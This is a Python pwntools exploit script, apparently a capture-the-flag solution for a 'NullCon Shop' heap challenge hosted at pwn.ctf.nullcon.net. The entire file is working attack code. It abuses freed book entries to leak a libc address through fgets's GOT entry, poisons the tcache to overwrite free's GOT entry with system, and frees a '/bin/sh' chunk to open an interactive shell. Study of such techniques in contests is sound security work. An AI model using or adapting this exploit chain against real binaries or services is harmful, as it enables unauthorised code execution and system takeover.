from pwn import *

def get_prompt():
	return p.recvuntil("> ")

def add_book(name,name_length,price):
	p.sendline("1")
	p.recvuntil("Book name length: ")
	p.sendline(str(name_length))
	p.recvuntil("Book name: ")
	p.send(name)
	p.recvuntil("Book price: ")
	p.sendline(str(price))
	get_prompt()

def remove_book(idx,interact=False):
	p.sendline("2")
	p.recvuntil("Book index: ")
	p.sendline(str(idx))
	if interact:
		p.interactive()
	else:
		get_prompt()

def list_book():
	p.sendline("3")
	ENDING = '''
	NullCon Shop
	(1) Add book to cart
	(2) Remove from cart
	(3) View cart
	(4) Check out
	> 
	'''
	data = get_prompt().strip(ENDING)
	return data

p = remote("pwn.ctf.nullcon.net",4002)
e = ELF("./remote-libc")
for i in range(8):
	add_book("/bin/sh\x00",0x8,100)
	log.info("added book %d"%i)

remove_book(0)
remove_book(1)

setbuf_got = 0x602040
fgets_got = 0x602060
free_got = 0x602018

FS = "FORMAT_STRING"
fake_book = p64(1234)+p64(fgets_got)+p64(3344)+FS

add_book(fake_book,0x38,100)

books = eval(list_book())["Books"]
leak = u64(books[0]['name'].ljust(8,"\x00"))

LIBC = leak - e.symbols['fgets']
system = LIBC + e.symbols['system']

log.info("LIBC: 0x%x"%LIBC)

remove_book(2)
remove_book(2)
remove_book(3)

add_book(p64(free_got),0x38,1122)
add_book(p64(system),0x38,3344)

log.success("got shell")
remove_book(4,interact=True)
#libc: libc6_2.27-3ubuntu1_amd64
p.interactive()